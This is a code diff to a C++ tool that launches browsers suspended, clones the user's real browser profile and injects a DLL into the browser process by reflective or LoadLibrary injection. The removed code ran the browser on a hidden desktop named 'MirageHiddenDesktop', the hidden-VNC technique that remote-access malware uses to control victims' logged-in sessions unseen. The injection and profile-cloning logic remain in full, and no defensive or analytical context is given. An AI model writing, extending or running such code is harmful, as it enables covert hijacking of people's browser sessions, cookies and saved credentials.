@@ -71,7 +71,6 @@ static constexpr DWORD PROCESS_ALL_ACCESS_INJ =
 // IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_OPTIONAL_HDR64_MAGIC
 // are all provided by <windows.h> / <winnt.h>; no re-definition needed.
 
-static const char* BACKSTAGE_DESKTOP_NAME = "MirageHiddenDesktop";
 
 // ---------------------------------------------------------------------------
 // Browser descriptor (mirrors Go browserInfo struct)
@@ -823,44 +822,35 @@ struct LaunchResult {
     DWORD    pid      = 0;
 };
 
-static LaunchResult CreateSuspendedOnDesktop(
+static LaunchResult CreateSuspendedProcess(
     const std::string& filePath,
     const std::string& searchPath,
     const std::string& replacePath,
     const std::string& shmName,
-    size_t             dllSize,
-    int                display)
+    size_t             dllSize)
 {
     LaunchResult res;
 
-    // Build command line with window position hint
-    // (display=0 → position 0,0; we don't enumerate monitors here,
-    //  mirrors the Go behaviour when no monitor lookup is available)
-    std::string args = " --window-position=0,0";
-
-    // Exe-specific flags (mirrors Go createSuspendedProcessOnDesktop)
+    // Exe-specific flags
     std::string baseName = fs::path(filePath).filename().string();
     std::string baseNameLow = ToLower(baseName);
     static const std::set<std::string> chromiumExes = {
         "chrome.exe", "brave.exe", "msedge.exe",
         "opera.exe",  "vivaldi.exe", "browser.exe", "arc.exe"
     };
+    std::string args;
     if (chromiumExes.count(baseNameLow)) {
-        args += " "; // Chromium needs the space; profile-dir env vars handle the rest
+        args = " "; // Chromium: space lets the DLL env vars take effect
     } else if (baseNameLow == "firefox.exe" || baseNameLow == "waterfox.exe") {
-        args += " -no-remote -wait-for-browser";
+        args = " -no-remote -wait-for-browser";
     }
 
     std::string cmdLine = filePath + args;
 
-    // Wide versions
-    int wlenCmd = MultiByteToWideChar(CP_UTF8, 0, cmdLine.c_str(), -1, nullptr, 0);
+    // Paths come from GetEnvironmentVariableA (ACP), so convert with CP_ACP.
+    int wlenCmd = MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, nullptr, 0);
     std::vector<wchar_t> wCmd(wlenCmd);
-    MultiByteToWideChar(CP_UTF8, 0, cmdLine.c_str(), -1, wCmd.data(), wlenCmd);
-
-    int wlenDesk = MultiByteToWideChar(CP_UTF8, 0, BACKSTAGE_DESKTOP_NAME, -1, nullptr, 0);
-    std::vector<wchar_t> wDesk(wlenDesk);
-    MultiByteToWideChar(CP_UTF8, 0, BACKSTAGE_DESKTOP_NAME, -1, wDesk.data(), wlenDesk);
+    MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, wCmd.data(), wlenCmd);
 
     // Build environment block
     auto envBlock = BuildEnvironmentBlock(searchPath, replacePath, shmName, dllSize);
@@ -870,11 +860,8 @@ static LaunchResult CreateSuspendedOnDesktop(
     }
 
     STARTUPINFOW si = {};
-    si.cb         = sizeof(si);
-    si.lpDesktop  = wDesk.data();
-    si.dwFlags    = STARTF_USEPOSITION;
-    si.dwX        = 0;
-    si.dwY        = 0;
+    si.cb        = sizeof(si);
+    si.lpDesktop = nullptr; // inherit current desktop — browser appears on screen normally
 
     PROCESS_INFORMATION pi = {};
     BOOL ok = CreateProcessW(
@@ -930,7 +917,6 @@ static DWORD StartProcessInjected(
     const std::vector<uint8_t>& dllBytes,
     const std::string&          searchPath,
     const std::string&          replacePath,
-    int                         display,
     InjectionMethod             method)
 {
     if (filePath.empty() || dllBytes.empty()) return 0;
@@ -945,8 +931,8 @@ static DWORD StartProcessInjected(
 
     EnableDebugPrivilege();
 
-    LaunchResult lr = CreateSuspendedOnDesktop(
-        filePath, searchPath, replacePath, sm.name, dllBytes.size(), display);
+    LaunchResult lr = CreateSuspendedProcess(
+        filePath, searchPath, replacePath, sm.name, dllBytes.size());
 
     if (!lr.pid) {
         CloseHandle(sm.handle);
@@ -991,7 +977,6 @@ static bool LaunchBrowser(
     const std::vector<uint8_t>& dllBytes,
     bool                        doClone,
     bool                        cloneLite,
-    int                         display,
     InjectionMethod             method)
 {
     auto notify = [&](const char* step, bool ok, const char* detail) {
@@ -1011,7 +996,7 @@ static bool LaunchBrowser(
 
     if (!doClone) {
         notify("launch", true, "starting without profile clone");
-        DWORD pid = StartProcessInjected(exePath, dllBytes, "", "", display, method);
+        DWORD pid = StartProcessInjected(exePath, dllBytes, "", "", method);
         if (!pid) { notify("launch", false, "CreateProcess failed"); return false; }
         char msg[64]; snprintf(msg, sizeof(msg), "PID %lu", pid);
         notify("launch", true, msg);
@@ -1041,7 +1026,7 @@ static bool LaunchBrowser(
     DWORD pid = StartProcessInjected(
         exePath, dllBytes,
         realUserData, cloneDir,
-        display, method);
+        method);
     if (!pid) { notify("launch", false, "CreateProcess failed"); return false; }
     char msg[64]; snprintf(msg, sizeof(msg), "PID %lu", pid);
     notify("launch", true, msg);
@@ -1075,7 +1060,6 @@ static void PrintUsage(const char* argv0) {
         "  --no-clone                 skip profile clone\n"
         "  --lite                     lite clone (skip extensions etc.)\n"
         "  --method reflective|loadlibrary\n"
-        "  --display <n>              display index (default 0)\n"
         "  --dll <path>               DLL path (default: beside exe)\n",
         argv0);
 }
@@ -1094,7 +1078,6 @@ int main(int argc, char* argv[]) {
     bool listOnly  = false;
     bool doClone   = true;
     bool cloneLite = false;
-    int  display   = 0;
 
     for (int i = 1; i < argc; ++i) {
         std::string a = argv[i];
@@ -1108,8 +1091,6 @@ int main(int argc, char* argv[]) {
             browserKey = argv[++i];
         } else if (a == "--method" && i + 1 < argc) {
             methodStr = argv[++i];
-        } else if (a == "--display" && i + 1 < argc) {
-            display = atoi(argv[++i]);
         } else if (a == "--dll" && i + 1 < argc) {
             dllPathOverride = argv[++i];
         } else if (a == "--help" || a == "-h") {
@@ -1169,7 +1150,7 @@ int main(int argc, char* argv[]) {
             fprintf(stderr, "ERROR: %s does not appear to be installed\n", target->name.c_str());
             return 1;
         }
-        return LaunchBrowser(*target, "", dllBytes, doClone, cloneLite, display, method) ? 0 : 1;
+        return LaunchBrowser(*target, "", dllBytes, doClone, cloneLite, method) ? 0 : 1;
     }
 
     // Interactive menu
@@ -1193,5 +1174,5 @@ int main(int argc, char* argv[]) {
     const BrowserInfo& selected = *available[choice - 1];
     printf("\nLaunching %s...\n", selected.name.c_str());
 
-    return LaunchBrowser(selected, "", dllBytes, doClone, cloneLite, display, method) ? 0 : 1;
+    return LaunchBrowser(selected, "", dllBytes, doClone, cloneLite, method) ? 0 : 1;
 }
